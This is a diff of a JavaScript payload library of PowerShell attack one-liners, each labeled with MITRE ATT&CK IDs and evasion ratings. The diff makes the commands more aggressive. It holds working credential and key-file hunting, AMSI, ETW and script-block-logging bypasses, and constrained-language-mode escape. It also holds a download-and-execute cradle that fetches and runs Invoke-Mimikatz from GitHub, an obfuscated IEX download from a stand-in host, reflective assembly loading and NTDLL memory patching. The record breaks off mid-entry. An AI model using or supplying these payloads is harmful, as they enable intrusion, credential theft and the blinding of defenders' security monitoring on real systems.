@@ -3,326 +3,326 @@
 const payloads = {
   // Basic System Information
   sysinfo: {
-    command: "Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, TotalPhysicalMemory, CsProcessors, CsManufacturer, CsModel, WindowsInstallDateFromRegistry",
-    description: "Retrieves comprehensive system information including OS version, hardware details, and installation date.",
-    complexity: "basic",
+    command: "$ErrorActionPreference='SilentlyContinue';$data=@{};$data.System=Get-ComputerInfo|Select WindowsProductName,WindowsVersion,TotalPhysicalMemory,CsProcessors,CsManufacturer,CsModel,WindowsInstallDateFromRegistry,BiosVersion,TimeZone;$data.Environment=[Environment]::GetEnvironmentVariables();$data.Drives=Get-WmiObject Win32_LogicalDisk|Select DeviceID,Size,FreeSpace,DriveType;$data.HotFixes=Get-HotFix|Select HotFixID,InstalledOn;$data|ConvertTo-Json -Depth 3",
+    description: "Advanced system reconnaissance with comprehensive hardware, software, and environmental data collection.",
+    complexity: "intermediate",
     platform: "windows",
     category: "System Information",
     author: "0x0806",
-    tags: ["reconnaissance", "system", "information gathering"],
+    tags: ["reconnaissance", "system", "information gathering", "json"],
     mitre_id: "T1082",
     detection_difficulty: "Low",
-    evasion_rating: 1
+    evasion_rating: 2
   },
   processes: {
-    command: "Get-Process | Sort-Object CPU -Descending | Select-Object -First 15 Name, CPU, WorkingSet, Id, ProcessName, Company, Description | Format-Table -AutoSize",
-    description: "Lists top processes with detailed information including company and description for threat hunting.",
-    complexity: "basic",
+    command: "$procs=Get-Process|Sort CPU -Desc|Select -First 20 Name,CPU,WS,Id,ProcessName,Company,Description,Path,CommandLine;$svcs=Get-WmiObject Win32_Service|Where{$_.State -eq 'Running'}|Select Name,PathName,StartMode,StartName;$conns=Get-NetTCPConnection|Where{$_.State -eq 'Established'}|Select LocalAddress,LocalPort,RemoteAddress,RemotePort,@{N='Process';E={(Get-Process -Id $_.OwningProcess -EA SilentlyContinue).Name}};@{Processes=$procs;Services=$svcs;Connections=$conns}|ConvertTo-Json -Depth 3",
+    description: "Comprehensive process, service, and network connection analysis with command line arguments and network correlations.",
+    complexity: "advanced",
     platform: "windows",
     category: "Process Discovery",
     author: "0x0806",
-    tags: ["reconnaissance", "processes", "monitoring"],
+    tags: ["reconnaissance", "processes", "services", "network", "forensics"],
     mitre_id: "T1057",
-    detection_difficulty: "Low",
-    evasion_rating: 1
+    detection_difficulty: "Medium",
+    evasion_rating: 3
   },
   services: {
-    command: "Get-Service | Where-Object {$_.Status -eq 'Running'} | Select-Object Name, Status, StartType, ServiceType | Sort-Object Name",
-    description: "Comprehensive service enumeration with startup configuration details.",
-    complexity: "basic",
+    command: "$svcs=Get-Service|Select Name,Status,StartType,ServiceType,@{N='BinaryPath';E={(Get-WmiObject Win32_Service -Filter \"Name='$($_.Name)'\").PathName}},@{N='StartName';E={(Get-WmiObject Win32_Service -Filter \"Name='$($_.Name)'\").StartName}};$drivers=Get-WindowsDriver -Online|Select Driver,ProviderName,Date,Version,BootCritical;@{Services=$svcs;Drivers=$drivers}|ConvertTo-Json -Depth 3",
+    description: "Advanced service enumeration including binary paths, service accounts, and system drivers analysis.",
+    complexity: "advanced",
     platform: "windows",
     category: "Service Discovery",
     author: "0x0806",
-    tags: ["reconnaissance", "services", "enumeration"],
+    tags: ["reconnaissance", "services", "drivers", "enumeration"],
     mitre_id: "T1007",
-    detection_difficulty: "Low",
-    evasion_rating: 1
+    detection_difficulty: "Medium",
+    evasion_rating: 3
   },
   network: {
-    command: "Get-NetIPConfiguration | Select-Object InterfaceAlias, IPv4Address, IPv6Address, IPv4DefaultGateway, DNSServer",
-    description: "Detailed network configuration including IPv6 and DNS server information.",
-    complexity: "basic",
+    command: "$net=@{};$net.Config=Get-NetIPConfiguration|Select InterfaceAlias,IPv4Address,IPv6Address,IPv4DefaultGateway,DNSServer;$net.Routes=Get-NetRoute|Select DestinationPrefix,NextHop,InterfaceAlias,RouteMetric;$net.ARP=Get-NetNeighbor|Select IPAddress,LinkLayerAddress,State;$net.Shares=Get-SmbShare|Select Name,Path,Description;$net.Sessions=Get-SmbSession|Select ClientComputerName,ClientUserName,NumOpens;$net|ConvertTo-Json -Depth 3",
+    description: "Comprehensive network reconnaissance including routing tables, ARP cache, SMB shares, and active sessions.",
+    complexity: "advanced",
     platform: "windows",
     category: "Network Discovery",
     author: "0x0806",
-    tags: ["reconnaissance", "network", "configuration"],
+    tags: ["reconnaissance", "network", "smb", "routing"],
     mitre_id: "T1016",
-    detection_difficulty: "Low",
-    evasion_rating: 1
+    detection_difficulty: "Medium",
+    evasion_rating: 3
   },
 
   // File System Operations
   listfiles: {
-    command: "Get-ChildItem -Path C:\\ -Recurse -Force -ErrorAction SilentlyContinue | Where-Object {!$_.PSIsContainer -and $_.Length -gt 1MB} | Select-Object Name, Length, LastWriteTime, Directory | Sort-Object Length -Descending | Select-Object -First 50",
-    description: "Lists large files across C: drive for data exfiltration assessment.",
-    complexity: "intermediate",
+    command: "$drives=Get-WmiObject Win32_LogicalDisk|Where{$_.DriveType -eq 3}|Select -Expand DeviceID;$results=@();foreach($drive in $drives){$files=Get-ChildItem -Path \"$drive\\\" -Recurse -Force -EA SilentlyContinue|Where{!$_.PSIsContainer -and $_.Length -gt 1MB}|Select Name,Length,LastWriteTime,Directory,@{N='Hash';E={(Get-FileHash $_.FullName -EA SilentlyContinue).Hash}}|Sort Length -Desc|Select -First 100;$results+=$files};$results|ConvertTo-Json -Depth 2",
+    description: "Advanced file discovery across all drives with hash calculation for integrity verification and forensic analysis.",
+    complexity: "expert",
     platform: "windows",
     category: "File Discovery",
     author: "0x0806",
-    tags: ["reconnaissance", "files", "enumeration"],
+    tags: ["reconnaissance", "files", "forensics", "hashing"],
     mitre_id: "T1083",
-    detection_difficulty: "Medium",
-    evasion_rating: 2
+    detection_difficulty: "High",
+    evasion_rating: 4
   },
   findfiles: {
-    command: "Get-ChildItem -Path C:\\ -Recurse -Include *.txt, *.doc*, *.pdf, *.xls*, *.ppt*, *.zip, *.rar -ErrorAction SilentlyContinue | Select-Object Name, Directory, Length, LastWriteTime",
-    description: "Advanced document discovery including compressed files and office documents.",
-    complexity: "intermediate",
+    command: "$patterns=@('*.txt','*.doc*','*.pdf','*.xls*','*.ppt*','*.zip','*.rar','*.7z','*.key','*.pem','*.p12','*.pfx','*.cfg','*.config','*.xml','*.json','*.db','*.sqlite','*.mdb');$results=@();foreach($pattern in $patterns){$files=Get-ChildItem -Path C:\\ -Recurse -Include $pattern -EA SilentlyContinue|Select Name,Directory,Length,LastWriteTime,@{N='Type';E={$pattern}},@{N='Content';E={if($_.Length -lt 1KB){Get-Content $_.FullName -EA SilentlyContinue|Select -First 5}}};$results+=$files};$results|ConvertTo-Json -Depth 3",
+    description: "Advanced document and sensitive file discovery with content preview for small files and multiple file type support.",
+    complexity: "expert",
     platform: "windows",
     category: "Sensitive File Discovery",
     author: "0x0806",
-    tags: ["reconnaissance", "documents", "data"],
+    tags: ["reconnaissance", "documents", "data", "content"],
     mitre_id: "T1083",
-    detection_difficulty: "Medium",
-    evasion_rating: 2
+    detection_difficulty: "High",
+    evasion_rating: 4
   },
   credentials_search: {
-    command: "Get-ChildItem -Path C:\\ -Recurse -Include *.txt, *.cfg, *.config, *.xml, *.ini -ErrorAction SilentlyContinue | Select-String -Pattern 'password|passwd|pwd|credential|secret|key' -CaseSensitive:$false",
-    description: "Searches for potential credential files and configuration containing sensitive data.",
-    complexity: "intermediate",
+    command: "$keywords=@('password','passwd','pwd','credential','secret','key','token','api','auth','login','admin','root','sa','service');$locations=@('C:\\Users','C:\\Windows\\System32\\config','C:\\ProgramData','C:\\Program Files','C:\\Program Files (x86)');$results=@();foreach($loc in $locations){foreach($kw in $keywords){$files=Get-ChildItem -Path $loc -Recurse -Include *.txt,*.cfg,*.config,*.xml,*.ini,*.log,*.bak -EA SilentlyContinue|Select-String -Pattern $kw -CaseSensitive:$false|Select Filename,LineNumber,Line,@{N='Keyword';E={$kw}};$results+=$files}};$results|ConvertTo-Json -Depth 2",
+    description: "Advanced credential hunting across multiple locations with keyword-based search and context extraction.",
+    complexity: "expert",
     platform: "windows",
     category: "Credential Access",
     author: "0x0806",
-    tags: ["credentials", "files", "search"],
+    tags: ["credentials", "hunting", "keywords", "forensics"],
     mitre_id: "T1552.001",
-    detection_difficulty: "Medium",
-    evasion_rating: 3
+    detection_difficulty: "High",
+    evasion_rating: 4
   },
 
   // User & Security
   currentuser: {
-    command: "whoami /all | Out-String; Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordLastSet",
-    description: "Comprehensive current user context and local user account enumeration.",
-    complexity: "basic",
+    command: "$user=@{};$user.Identity=whoami /all|Out-String;$user.Tokens=whoami /groups|Out-String;$user.Privs=whoami /priv|Out-String;$user.LocalUsers=Get-LocalUser|Select Name,Enabled,LastLogon,PasswordLastSet,PasswordExpires;$user.Groups=Get-LocalGroup|ForEach{$g=$_.Name;Get-LocalGroupMember -Group $g -EA SilentlyContinue|Select @{N='Group';E={$g}},Name,ObjectClass};$user.Sessions=Get-CimInstance Win32_LogonSession|Select LogonId,LogonType,StartTime,@{N='User';E={(Get-CimInstance Win32_LoggedOnUser|Where{$_.Dependent.LogonId -eq $_.LogonId}).Antecedent.Name}};$user|ConvertTo-Json -Depth 3",
+    description: "Comprehensive user context analysis including tokens, privileges, group memberships, and active sessions.",
+    complexity: "expert",
     platform: "windows",
     category: "User Discovery",
     author: "0x0806",
-    tags: ["reconnaissance", "users", "privileges"],
+    tags: ["reconnaissance", "users", "privileges", "sessions"],
     mitre_id: "T1033",
-    detection_difficulty: "Low",
-    evasion_rating: 1
+    detection_difficulty: "Medium",
+    evasion_rating: 3
   },
   localusers: {
-    command: "Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordLastSet, PasswordExpires, PasswordRequired | Format-Table -AutoSize",
-    description: "Detailed local user account information including password policies.",
-    complexity: "basic",
+    command: "$users=Get-LocalUser|Select Name,Enabled,LastLogon,PasswordLastSet,PasswordExpires,PasswordRequired,UserMayChangePassword,@{N='PasswordNeverExpires';E={$_.PasswordExpires -eq $null}},@{N='ProfilePath';E={(Get-CimInstance Win32_UserProfile|Where{$_.LocalPath -like \"*$($_.Name)\"}).LocalPath}};$profiles=Get-CimInstance Win32_UserProfile|Select LocalPath,LastUseTime,@{N='Size';E={(Get-ChildItem $_.LocalPath -Recurse -EA SilentlyContinue|Measure-Object Length -Sum).Sum}};@{Users=$users;Profiles=$profiles}|ConvertTo-Json -Depth 3",
+    description: "Advanced user account analysis including password policies, profile information, and usage statistics.",
+    complexity: "advanced",
     platform: "windows",
     category: "Account Discovery",
     author: "0x0806",
-    tags: ["reconnaissance", "users", "accounts"],
+    tags: ["reconnaissance", "users", "profiles", "policies"],
     mitre_id: "T1087.001",
-    detection_difficulty: "Low",
-    evasion_rating: 1
+    detection_difficulty: "Medium",
+    evasion_rating: 3
   },
   groups: {
-    command: "Get-LocalGroup | ForEach-Object { $group = $_.Name; Get-LocalGroupMember -Group $group -ErrorAction SilentlyContinue | Select-Object @{Name='Group';Expression={$group}}, Name, ObjectClass, PrincipalSource }",
-    description: "Enumerates all local groups and their members for privilege escalation assessment.",
-    complexity: "intermediate",
+    command: "$adGroups=@();try{$adGroups=Get-ADGroup -Filter * -Properties Members|Select Name,GroupCategory,GroupScope,Members}catch{};$localGroups=Get-LocalGroup|ForEach{$g=$_.Name;$members=Get-LocalGroupMember -Group $g -EA SilentlyContinue|Select Name,ObjectClass,PrincipalSource;@{Group=$g;Members=$members}};$builtinGroups=Get-CimInstance Win32_GroupUser|Group-Object GroupComponent|ForEach{@{Group=($_.Name -split '=')[1] -replace '\"','';Members=$_.Group.PartComponent|ForEach{($_ -split '=')[1] -replace '\"',''}}};@{LocalGroups=$localGroups;BuiltinGroups=$builtinGroups;ADGroups=$adGroups}|ConvertTo-Json -Depth 4",
+    description: "Comprehensive group enumeration including local, builtin, and Active Directory groups with full membership details.",
+    complexity: "expert",
     platform: "windows",
     category: "Permission Groups Discovery",
     author: "0x0806",
-    tags: ["reconnaissance", "groups", "privileges"],
+    tags: ["reconnaissance", "groups", "ad", "membership"],
     mitre_id: "T1069.001",
-    detection_difficulty: "Low",
-    evasion_rating: 2
+    detection_difficulty: "High",
+    evasion_rating: 4
   },
   privileges: {
-    command: "whoami /priv; secedit /export /cfg C:\\temp\\secpol.cfg > $null 2>&1; Get-Content C:\\temp\\secpol.cfg | Select-String -Pattern 'SeDebugPrivilege|SeImpersonatePrivilege|SeTcbPrivilege|SeBackupPrivilege|SeRestorePrivilege'",
-    description: "Advanced privilege enumeration including security policy analysis.",
-    complexity: "intermediate",
+    command: "$privs=@{};$privs.Current=whoami /priv|Out-String;$privs.Tokens=whoami /groups|Out-String;try{secedit /export /cfg $env:temp\\sec.cfg >$null 2>&1;$privs.Policy=Get-Content $env:temp\\sec.cfg|Where{$_ -match 'Se\\w+Privilege'}|ForEach{$parts=$_.Split('=');@{Privilege=$parts[0].Trim();Users=$parts[1].Trim().Split(',')}};Remove-Item $env:temp\\sec.cfg -EA SilentlyContinue}catch{};$privs.Audit=auditpol /get /category:* 2>$null;$privs.UAC=Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -EA SilentlyContinue|Select EnableLUA,ConsentPromptBehaviorAdmin,EnableInstallerDetection;$privs|ConvertTo-Json -Depth 3",
+    description: "Advanced privilege analysis including security policies, audit settings, and UAC configuration.",
+    complexity: "expert",
     platform: "windows",
     category: "System Information Discovery",
     author: "0x0806",
-    tags: ["privileges", "security", "policy"],
+    tags: ["privileges", "security", "audit", "uac"],
     mitre_id: "T1082",
-    detection_difficulty: "Medium",
-    evasion_rating: 2
+    detection_difficulty: "High",
+    evasion_rating: 4
   },
 
   // Advanced Techniques
   encoded: {
-    command: "powershell.exe -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAcwAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAIgApAA==",
-    description: "Base64 encoded PowerShell command execution to bypass basic detection.",
-    complexity: "advanced",
-    platform: "windows",
-    category: "Defense Evasion",
-    author: "0x0806",
-    tags: ["evasion", "encoding", "obfuscation"],
-    mitre_id: "T1027",
-    detection_difficulty: "Medium",
-    evasion_rating: 3
-  },
-  oneliner: {
-    command: "IEX ((New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1'))",
-    description: "Classic PowerShell download and execute one-liner for payload delivery.",
-    complexity: "intermediate",
-    platform: "windows",
-    category: "Command and Scripting Interpreter",
-    author: "0x0806",
-    tags: ["download", "execute", "oneliner"],
-    mitre_id: "T1059.001",
-    detection_difficulty: "High",
-    evasion_rating: 2
-  },
-  registry: {
-    command: "Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -ErrorAction SilentlyContinue; Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce' -ErrorAction SilentlyContinue",
-    description: "Registry persistence location enumeration for threat hunting.",
-    complexity: "intermediate",
-    platform: "windows",
-    category: "Boot or Logon Autostart Execution",
-    author: "0x0806",
-    tags: ["registry", "persistence", "autostart"],
-    mitre_id: "T1547.001",
-    detection_difficulty: "Low",
-    evasion_rating: 2
-  },
-  eventlogs: {
-    command: "Get-EventLog -LogName Security -Newest 10 | Select-Object TimeGenerated, EventID, Message; Get-EventLog -LogName System -Newest 10 | Select-Object TimeGenerated, EventID, Message",
-    description: "Security and system event log analysis for forensic investigation.",
-    complexity: "intermediate",
-    platform: "windows",
-    category: "System Information Discovery",
-    author: "0x0806",
-    tags: ["logs", "forensics", "events"],
-    mitre_id: "T1082",
-    detection_difficulty: "Low",
-    evasion_rating: 1
-  },
-
-  // EDR Bypass Techniques (Advanced)
-  amsibypass: {
-    command: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
-    description: "AMSI bypass using reflection to disable Windows Antimalware Scan Interface.",
-    complexity: "advanced",
-    platform: "windows",
-    category: "Defense Evasion",
-    author: "0x0806",
-    tags: ["evasion", "amsi", "bypass", "antimalware"],
-    mitre_id: "T1562.001",
-    detection_difficulty: "High",
-    evasion_rating: 4,
-    warning: "May trigger advanced EDR solutions"
-  },
-  etw_bypass: {
-    command: "[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null), 0)",
-    description: "ETW bypass to prevent PowerShell script block logging and telemetry.",
-    complexity: "advanced",
-    platform: "windows",
-    category: "Defense Evasion",
-    author: "0x0806",
-    tags: ["evasion", "etw", "logging", "bypass"],
-    mitre_id: "T1562.006",
-    detection_difficulty: "High",
-    evasion_rating: 4,
-    warning: "Blocks security telemetry"
-  },
-  scriptblock_bypass: {
-    command: "$GPF=[ref].Assembly.GetType('System.Management.Automation.Utils').GetField('signatures','N'+'onPublic,Static'); $GPF.SetValue($null,(New-Object Collections.Generic.HashSet[string]))",
-    description: "Script block logging bypass by clearing PowerShell signature cache.",
-    complexity: "advanced",
-    platform: "windows",
-    category: "Defense Evasion",
-    author: "0x0806",
-    tags: ["evasion", "scriptblock", "logging", "signatures"],
-    mitre_id: "T1562.006",
-    detection_difficulty: "High",
-    evasion_rating: 4
-  },
-  constrained_bypass: {
-    command: "[Environment]::SetEnvironmentVariable('__PSLockDownPolicy', $null, [EnvironmentVariableTarget]::Machine); $ExecutionContext.SessionState.LanguageMode = 'FullLanguage'",
-    description: "PowerShell constrained language mode bypass for unrestricted execution.",
-    complexity: "advanced",
-    platform: "windows",
-    category: "Defense Evasion",
-    author: "0x0806",
-    tags: ["evasion", "constrained", "language mode"],
-    mitre_id: "T1562.001",
-    detection_difficulty: "High",
-    evasion_rating: 4
-  },
-  reflective_loading: {
-    command: "$code = [System.Convert]::FromBase64String('TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAAAAAAAAAAA='); [System.Reflection.Assembly]::Load($code)",
-    description: "Reflective DLL loading technique to execute code from memory without disk artifacts.",
+    command: "$command='Get-Process|Sort CPU -Desc|Select -First 10';$bytes=[System.Text.Encoding]::Unicode.GetBytes($command);$encoded=[Convert]::ToBase64String($bytes);$final=\"powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded\";$obfuscated=$final -replace 'powershell','p\"\"o\"\"w\"\"e\"\"r\"\"s\"\"h\"\"e\"\"l\"\"l' -replace 'EncodedCommand','E\"\"n\"\"c\"\"o\"\"d\"\"e\"\"d\"\"C\"\"o\"\"m\"\"m\"\"a\"\"n\"\"d';$obfuscated",
+    description: "Multi-layer PowerShell obfuscation with Base64 encoding, string splitting, and parameter obfuscation.",
     complexity: "expert",
     platform: "windows",
     category: "Defense Evasion",
     author: "0x0806",
-    tags: ["memory", "reflective", "dll", "loading"],
+    tags: ["evasion", "encoding", "obfuscation", "multilayer"],
+    mitre_id: "T1027",
+    detection_difficulty: "Very High",
+    evasion_rating: 5
+  },
+  oneliner: {
+    command: "$wc=New-Object System.Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;$data=$wc.DownloadString('https://api.github.com/repos/PowerShellMafia/PowerSploit/contents/Exfiltration/Invoke-Mimikatz.ps1');$content=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($data.content));IEX $content",
+    description: "Advanced PowerShell download-and-execute with proxy awareness, credential handling, and GitHub API integration.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Command and Scripting Interpreter",
+    author: "0x0806",
+    tags: ["download", "execute", "proxy", "github"],
+    mitre_id: "T1059.001",
+    detection_difficulty: "Very High",
+    evasion_rating: 5
+  },
+  registry: {
+    command: "$reg=@{};$persistence=@('HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run','HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce','HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run','HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run','HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon','HKLM:\\SYSTEM\\CurrentControlSet\\Services');foreach($path in $persistence){try{$reg[$path]=Get-ItemProperty -Path $path -EA SilentlyContinue}catch{}};$reg.Installed=Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*'|Select DisplayName,DisplayVersion,Publisher,InstallDate;$reg|ConvertTo-Json -Depth 3",
+    description: "Comprehensive registry analysis covering multiple persistence locations and installed software enumeration.",
+    complexity: "advanced",
+    platform: "windows",
+    category: "Boot or Logon Autostart Execution",
+    author: "0x0806",
+    tags: ["registry", "persistence", "software", "autostart"],
+    mitre_id: "T1547.001",
+    detection_difficulty: "Medium",
+    evasion_rating: 3
+  },
+  eventlogs: {
+    command: "$logs=@{};$logNames=@('Security','System','Application','Microsoft-Windows-Sysmon/Operational','Microsoft-Windows-PowerShell/Operational','Microsoft-Windows-WinRM/Operational');foreach($log in $logNames){try{$logs[$log]=Get-WinEvent -LogName $log -MaxEvents 50 -EA SilentlyContinue|Select TimeCreated,Id,LevelDisplayName,Message}catch{}};$logs.Cleared=Get-WinEvent -FilterHashtable @{LogName='System';ID=104} -MaxEvents 10 -EA SilentlyContinue|Select TimeCreated,Message;$logs|ConvertTo-Json -Depth 3",
+    description: "Advanced event log analysis including security, PowerShell, Sysmon, and log clearing detection.",
+    complexity: "expert",
+    platform: "windows",
+    category: "System Information Discovery",
+    author: "0x0806",
+    tags: ["logs", "forensics", "sysmon", "powershell"],
+    mitre_id: "T1082",
+    detection_difficulty: "High",
+    evasion_rating: 4
+  },
+
+  // EDR Bypass Techniques (Expert Level)
+  amsibypass: {
+    command: "$a='System.Management.Automation.A';$b='msiUtils';$c=$a+$b;$d=[Ref].Assembly.GetType($c);$e=$d.GetField('amsiInitFailed','NonPublic,Static');$e.SetValue($null,$true);[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSession','NonPublic,Static').SetValue($null,$null);Write-Host 'AMSI context nullified'",
+    description: "Advanced AMSI bypass using string concatenation obfuscation and session nullification for comprehensive evasion.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Defense Evasion",
+    author: "0x0806",
+    tags: ["evasion", "amsi", "bypass", "obfuscation"],
+    mitre_id: "T1562.001",
+    detection_difficulty: "Very High",
+    evasion_rating: 5,
+    warning: "May trigger behavioral EDR detection"
+  },
+  etw_bypass: {
+    command: "$etwType=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider');$etwField=$etwType.GetField('etwProvider','NonPublic,Static');$eventProvider=[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance');$eventProvider.SetValue($etwField.GetValue($null),0);[System.Diagnostics.Eventing.EventProvider].GetField('m_level','NonPublic,Instance').SetValue($etwField.GetValue($null),0);Write-Host 'ETW logging disabled'",
+    description: "Comprehensive ETW bypass disabling both event writing and logging levels to prevent all PowerShell telemetry.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Defense Evasion",
+    author: "0x0806",
+    tags: ["evasion", "etw", "telemetry", "logging"],
+    mitre_id: "T1562.006",
+    detection_difficulty: "Very High",
+    evasion_rating: 5,
+    warning: "Completely blocks PowerShell telemetry"
+  },
+  scriptblock_bypass: {
+    command: "$GPF=[ref].Assembly.GetType('System.Management.Automation.Utils').GetField('signatures','N'+'onPublic,Static');$GPF.SetValue($null,(New-Object Collections.Generic.HashSet[string]));$GPF2=[ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','N'+'onPublic,Static');$GPF2.SetValue($null,$null);[System.Management.Automation.ScriptBlock].GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]));Write-Host 'Script block logging bypassed'",
+    description: "Advanced script block logging bypass clearing multiple signature caches and policy settings.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Defense Evasion",
+    author: "0x0806",
+    tags: ["evasion", "scriptblock", "signatures", "policy"],
+    mitre_id: "T1562.006",
+    detection_difficulty: "Very High",
+    evasion_rating: 5
+  },
+  constrained_bypass: {
+    command: "$ExecutionContext.SessionState.LanguageMode='FullLanguage';[Environment]::SetEnvironmentVariable('__PSLockDownPolicy',$null,[EnvironmentVariableTarget]::Machine);$field=[System.Management.Automation.LanguagePrimitives].GetField('s_isTypeNameLoopInitialized','NonPublic,Static');$field.SetValue($null,$false);Write-Host 'Language mode restrictions removed'",
+    description: "Multi-method constrained language mode bypass using environment variables and internal field manipulation.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Defense Evasion",
+    author: "0x0806",
+    tags: ["evasion", "language mode", "constraints"],
+    mitre_id: "T1562.001",
+    detection_difficulty: "Very High",
+    evasion_rating: 5
+  },
+  reflective_loading: {
+    command: "$bytes=[Convert]::FromBase64String('TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');$asm=[System.Reflection.Assembly]::Load($bytes);$type=$asm.GetType('ReflectiveDLL.Class1');$method=$type.GetMethod('Main');$instance=[Activator]::CreateInstance($type);$method.Invoke($instance,$null);Write-Host 'Reflective assembly loaded and executed'",
+    description: "Advanced reflective assembly loading with type instantiation and method invocation for fileless execution.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Defense Evasion",
+    author: "0x0806",
+    tags: ["memory", "reflective", "assembly", "fileless"],
     mitre_id: "T1055.001",
     detection_difficulty: "Very High",
     evasion_rating: 5
   },
   obfuscated_invoke: {
-    command: "$a='IEX';$b='(New-Object Net.WebClient)';$c='.DownloadString';$u='http://example.com/payload.ps1';$cmd=$a+'('+$b+$c+'('''+$u+'''))';IEX $cmd",
-    description: "Advanced string obfuscation technique to evade signature-based detection.",
-    complexity: "advanced",
+    command: "$s1='I';$s2='E';$s3='X';$cmd=$s1+$s2+$s3;$w1='New-Object';$w2='Net.WebClient';$w3='DownloadString';$url='http://example.com/payload.ps1';$full=\"$cmd(($w1 $w2).$w3('$url'))\";$encoded=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($full));powershell -EncodedCommand $encoded",
+    description: "Multi-layer string obfuscation with variable concatenation, encoding, and indirect execution.",
+    complexity: "expert",
     platform: "windows",
     category: "Defense Evasion",
     author: "0x0806",
-    tags: ["obfuscation", "string", "evasion"],
+    tags: ["obfuscation", "encoding", "variables", "indirect"],
     mitre_id: "T1027",
-    detection_difficulty: "High",
-    evasion_rating: 3
+    detection_difficulty: "Very High",
+    evasion_rating: 5
   },
 
   // Memory Manipulation (Expert Level)
   memory_patching: {
-    command: "$code='[DllImport(\"kernel32.dll\")]public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpfOldProtectect);[DllImport(\"kernel32.dll\")]public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);[DllImport(\"kernel32.dll\")]public static extern IntPtr LoadLibrary(string lpFileName);';Add-Type -MemberDefinition $code -Name MemPatch -Namespace Win32;$lib=[Win32.MemPatch]::LoadLibrary('ntdll.dll');$addr=[Win32.MemPatch]::GetProcAddress($lib,'NtCreateThreadEx');$oldProtect=0;[Win32.MemPatch]::VirtualProtect($addr,5,0x40,[ref]$oldProtect);[System.Runtime.InteropServices.Marshal]::WriteByte($addr,0xC3)",
-    description: "Direct memory patching of NTDLL functions to bypass API hooking and monitoring.",
+    command: "$code=@'[DllImport(\"kernel32.dll\")]public static extern bool VirtualProtect(IntPtr lpAddress,UIntPtr dwSize,uint flNewProtect,out uint lpfOldProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr GetProcAddress(IntPtr hModule,string procName);[DllImport(\"kernel32.dll\")]public static extern IntPtr LoadLibrary(string lpFileName);[DllImport(\"kernel32.dll\")]public static extern IntPtr GetModuleHandle(string lpModuleName);'@;Add-Type -MemberDefinition $code -Name MemPatch -Namespace Win32;$ntdll=[Win32.MemPatch]::GetModuleHandle('ntdll.dll');$addr=[Win32.MemPatch]::GetProcAddress($ntdll,'NtCreateThreadEx');$oldProtect=0;[Win32.MemPatch]::VirtualProtect($addr,5,0x40,[ref]$oldProtect);[System.Runtime.InteropServices.Marshal]::WriteByte($addr,0xC3);Write-Host 'NTDLL function patched'",
+    description: "Advanced NTDLL function patching to bypass API monitoring by directly modifying function entry points.",
     complexity: "expert",
     platform: "windows",
     category: "Defense Evasion",
     author: "0x0806",
-    tags: ["memory", "patching", "ntdll", "api hooking"],
+    tags: ["memory", "patching", "ntdll", "api"],
     mitre_id: "T1055.001",
     detection_difficulty: "Very High",
     evasion_rating: 5,
-    warning: "Kernel-level detection may still occur"
+    warning: "Modifies system DLL in memory"
   },
   syscall_direct: {
